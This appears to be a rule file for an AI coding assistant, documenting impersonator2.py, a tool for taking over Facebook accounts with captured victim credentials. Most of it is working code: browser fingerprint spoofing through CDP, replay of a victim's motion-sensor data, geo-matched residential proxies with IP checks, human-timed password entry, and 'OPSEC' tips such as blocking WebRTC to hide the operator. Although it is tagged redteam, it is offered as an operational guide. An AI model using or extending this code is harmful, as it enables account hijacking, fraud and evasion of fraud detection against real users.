---
trigger: model_decision
description: "TAGS: [redteam,impersonator,digital-twin,session-injection,fingerprint] | TRIGGERS: impersonator,twin,session,injection,fingerprint,replay,camoufox,selenium | SCOPE: impersonation | DESCRIPTION: Digital twin session injection patterns using impersonator2.py"
globs:
---
# Impersonator Digital Twin Module

## Scope
Session injection and fingerprint replay patterns using impersonator2.py for account takeover after credential/session capture.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     DIGITAL TWIN INJECTION FLOW                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  [sessions.json] ─► [impersonator2.py] ─► [Browser w/ Forged Identity]  │
│        │                    │                        │                   │
│        ▼                    ▼                        ▼                   │
│  [Fingerprint]    [DataImpulse Proxy]      [Facebook Session]           │
│  [Location]       [Geo-Matched IP]          [Account Access]            │
│  [Credentials]    [selenium-wire]                                        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

## Core Components

### 1. Profile Data Structure
```json
{
  "sessionId": "FP_1733500000000_abc123def",
  "timestamp_first_seen": "2024-12-06 15:30:00",
  "ip_address": "203.177.x.x",
  "location": {
    "country": "PH",
    "region": "Metro Manila",
    "city": "Caloocan City",
    "zip": "1409",
    "asn": "132199",
    "isp": "PLDT",
    "lat": 14.6488,
    "lon": 120.9839
  },
  "fingerprint": {
    "sessionId": "FP_1733500000000_abc123def",
    "userAgent": "Mozilla/5.0 (Linux; Android 12; V2026)...",
    "platform": "Linux armv8l",
    "screenResolution": "393x852",
    "devicePixelRatio": 3,
    "hardwareConcurrency": 8,
    "deviceMemory": 8,
    "language": "en-US",
    "languages": ["en-US", "en"],
    "timezone": "Asia/Manila",
    "touchSupport": 5,
    "webGLVendor": "Qualcomm",
    "webGLRenderer": "Adreno (TM) 610",
    "colorDepth": 24,
    "batteryLevel": 0.85,
    "batteryCharging": false,
    "connectionType": "4g",
    "connectionDownlink": 10,
    "orientationType": "portrait-primary",
    "orientationAngle": 0
  },
  "credentials": [
    {
      "username": "target@email.com",
      "password": "captured_password",
      "timestamp": "2024-12-06 15:35:00"
    }
  ]
}
```

### 2. Browser Identity Forging

#### Driver Creation with Fingerprint Injection
```python
def create_driver(profile_data, proxy_string=None, use_camoufox=False):
    """
    Creates WebDriver with forged fingerprint matching victim exactly.
    
    Args:
        profile_data: Dict from sessions.json containing fingerprint
        proxy_string: DataImpulse geo-matched proxy URL
        use_camoufox: Use Camoufox (Firefox/Playwright) vs Chrome/Selenium
    """
    fp = profile_data.get('fingerprint')
    if not fp:
        raise KeyError("'fingerprint' key not found in profile data")
    
    options = webdriver.ChromeOptions()
    
    # --- Anti-Automation Flags ---
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    # --- Exact User Agent from Victim ---
    victim_ua = fp.get('userAgent')
    options.add_argument(f"--user-agent={victim_ua}")
    
    # --- Device Emulation via DevTools ---
    options.add_argument("--auto-open-devtools-for-tabs")
    options.add_argument("--enable-features=MobileEmulation")
```

#### CDP Fingerprint Injection Script
```javascript
// COMPLETE FINGERPRINT REPLAY - Injected via Page.addScriptToEvaluateOnNewDocument
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
Object.defineProperty(navigator, 'platform', { get: () => '{platform}' });
Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => {hardware_concurrency} });
Object.defineProperty(navigator, 'deviceMemory', { get: () => {device_memory} });
Object.defineProperty(navigator, 'language', { get: () => '{language}' });
Object.defineProperty(navigator, 'languages', { get: () => {languages_js} });
Object.defineProperty(navigator, 'userAgent', { get: () => '{user_agent}' });
Object.defineProperty(navigator, 'maxTouchPoints', { get: () => {touch_support} });
Object.defineProperty(window, 'devicePixelRatio', { get: () => {device_pixel_ratio} });

// Screen properties
Object.defineProperty(screen, 'width', { get: () => {width} });
Object.defineProperty(screen, 'height', { get: () => {height} });
Object.defineProperty(screen, 'colorDepth', { get: () => {color_depth} });
Object.defineProperty(screen, 'availWidth', { get: () => {avail_width} });
Object.defineProperty(screen, 'availHeight', { get: () => {avail_height} });

// Timezone spoof
Intl.DateTimeFormat = function() { 
    return { resolvedOptions: () => ({ timeZone: '{timezone}' }) }; 
};

// Battery API
navigator.getBattery = () => Promise.resolve({
    level: {battery_level},
    charging: {battery_charging},
    chargingTime: Infinity,
    dischargingTime: Infinity
});

// Connection API
Object.defineProperty(navigator, 'connection', {
    get: () => ({
        effectiveType: '{connection_type}',
        downlink: {connection_downlink},
        rtt: 50,
        saveData: false
    })
});

// WebGL Fingerprinting
const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function(param) {
    if (param === 37445) return '{webgl_vendor}';    // VENDOR
    if (param === 37446) return '{webgl_renderer}';  // RENDERER
    if (param === 37447) return '{webgl_unmasked_vendor}';
    if (param === 37448) return '{webgl_unmasked_renderer}';
    return originalGetParameter.call(this, param);
};

// WebRTC Blocking (CRITICAL - prevents IP leak)
delete window.RTCPeerConnection;
delete window.webkitRTCPeerConnection;
window.RTCPeerConnection = function() {
    throw new Error('WebRTC is disabled for security');
};
```

### 3. Biometric Sensor Replay

```javascript
// BIOMETRIC REPLAY ENGINE - 1:1 Victim Data Replay
(function() {
    const victimSensors = {victim_sensors_json};
    const victimTouchPatterns = {victim_touch_patterns_json};
    
    function replaySensorStream(sensorData) {
        if (!sensorData || !Array.isArray(sensorData) || sensorData.length === 0) {
            console.log('[NyxSec] No victim sensor data, using fallback simulation');
            startFallbackSensorSimulation();
            return;
        }
        
        sensorData.forEach((point, index) => {
            const delay = point.timestamp - (sensorData[0]?.timestamp || 0);
            
            setTimeout(() => {
                // DeviceOrientationEvent
                const orientationEvent = new DeviceOrientationEvent('deviceorientation', {
                    alpha: point.alpha || 0,
                    beta: point.beta || 0,
                    gamma: point.gamma || 0,
                    absolute: true
                });
                window.dispatchEvent(orientationEvent);
                
                // DeviceMotionEvent
                const motionEvent = new DeviceMotionEvent('devicemotion', {
                    acceleration: { x: point.x || 0, y: point.y || 0, z: point.z || 9.81 },
                    accelerationIncludingGravity: { x: point.x, y: point.y, z: point.z },
                    rotationRate: { alpha: point.alpha/100, beta: point.beta/100, gamma: point.gamma/100 },
                    interval: 16  // ~60fps
                });
                window.dispatchEvent(motionEvent);
            }, delay);
        });
    }
    
    // Expose for manual triggering
    window.replaySensorStream = replaySensorStream;
    
    // Start replay
    replaySensorStream(victimSensors);
})();
```

## Proxy Configuration

### selenium-wire SOCKS5 with Authentication
```python
def configure_proxy(proxy_string):
    """Configure selenium-wire for SOCKS5 proxy with authentication."""
    
    # Parse: socks5://username__cr.ph;state.x:password@host:port
    scheme, rest = proxy_string.split('://', 1)
    credentials_part, host_port = rest.rsplit('@', 1)
    
    # Find LAST colon to split username from password
    last_colon = credentials_part.rfind(':')
    proxy_user = credentials_part[:last_colon]
    proxy_pass = credentials_part[last_colon+1:]
    
    host, port = host_port.rsplit(':', 1)
    
    # selenium-wire configuration (supports SOCKS5 auth natively)
    seleniumwire_options = {
        'proxy': {
            'http': f'socks5://{proxy_user}:{proxy_pass}@{host}:{port}',
            'https': f'socks5://{proxy_user}:{proxy_pass}@{host}:{port}',
            'no_proxy': 'localhost,127.0.0.1'
        }
    }
    
    return seleniumwire_options
```

### Proxy IP Verification
```python
def verify_proxy_ip_matches_victim(driver, victim_ip, victim_location, max_attempts=5):
    """Verify proxy IP matches victim's geo-location."""
    
    for attempt in range(max_attempts):
        # Check current IP through multiple services
        proxy_ip = _get_proxy_ip_via_driver(driver, [
            "https://api.ipify.org?format=json",
            "https://checkip.amazonaws.com",
            "https://ipinfo.io/json"
        ])
        
        # Get geo data for proxy IP
        response = requests.get(f'http://ip-api.com/json/{proxy_ip}', timeout=5)
        proxy_location = response.json()
        
        if proxy_location.get('status') == 'success':
            victim_country = victim_location.get('country')
            proxy_country = proxy_location.get('countryCode')
            
            if proxy_country == victim_country:
                print(f"[SUCCESS] Proxy matches victim location: {proxy_country}")
                return True
        
        time.sleep(PROXY_RETRY_DELAY)
    
    return False
```

## Human-like Behavior

### Human Typing Simulation
```python
def human_type(element, text):
    """Type text character by character with human-like delays."""
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.05, 0.2))

def auto_type_login_credentials(driver, username, password):
    """Automatically type credentials with human timing."""
    wait = WebDriverWait(driver, 15)
    
    # Find email input
    email_locators = [
        (By.NAME, "email"),
        (By.ID, "m_login_email"),
        (By.CSS_SELECTOR, "input[type='email']"),
        (By.CSS_SELECTOR, "input[type='text']")
    ]
    
    email_input = None
    for locator in email_locators:
        try:
            email_input = wait.until(EC.presence_of_element_located(locator))
            break
        except: continue
    
    if email_input:
        time.sleep(random.uniform(0.5, 1.2))  # Pre-type delay
        human_type(email_input, username)
        
        # Find and type password
        password_input = driver.find_element(By.NAME, "pass")
        time.sleep(random.uniform(0.5, 1.2))
        human_type(password_input, password)
        
        # Submit
        time.sleep(random.uniform(0.8, 1.5))
        password_input.submit()
```

## CLI Usage

### Basic Execution
```bash
python3 impersonator2.py \
  --profile "/tmp/victim_profiles/FP_xxx_profile.json" \
  --username "target@email.com" \
  --password "captured_password" \
  --proxy "socks5://user__cr.ph;asn.132199:pass@gw.dataimpulse.com:10000"
```

### With Camoufox (Firefox/Playwright)
```bash
python3 impersonator2.py \
  --profile "/tmp/victim_profiles/FP_xxx_profile.json" \
  --username "target@email.com" \
  --password "captured_password" \
  --proxy "http://user:pass@proxy:port" \
  --use-camoufox
```

**Note**: Camoufox (Playwright Firefox) does NOT support SOCKS5 proxy authentication. Use HTTP proxy or Chrome/Selenium for SOCKS5.

## OPSEC Considerations

1. **Credential Masking**: Always mask credentials in logs
   ```python
   def mask_credential(credential, mask_length=3):
       if len(credential) <= mask_length:
           return '*' * len(credential)
       return f"{credential[:mask_length]}...{'*' * 10}"
   ```

2. **WebRTC Blocking**: Critical to prevent real IP leak through WebRTC
   
3. **Proxy Verification**: Always verify proxy IP matches victim location before login attempt

4. **Session Status Tracking**: Update sessions.json with takeover status for evidence

5. **Error Handling**: Use centralized CDP error handler
   ```python
   def handle_cdp_error(operation_name, error, raise_on_critical=True):
       if raise_on_critical:
           print(f"[ERROR] Failed {operation_name}: {error}")
           raise
       else:
           print(f"[WARNING] {operation_name} failed: {error}")
   ```

## Integration Points

| Component | Interface | Data Flow |
|-----------|----------|-----------|
| sessions.json | Input | Fingerprint + credentials + location |
| master_watcher2.py | Trigger | Monitors for new credentials |
| DataImpulse | Proxy | Geo-matched residential IP |
| Facebook | Target | Session injection endpoint |
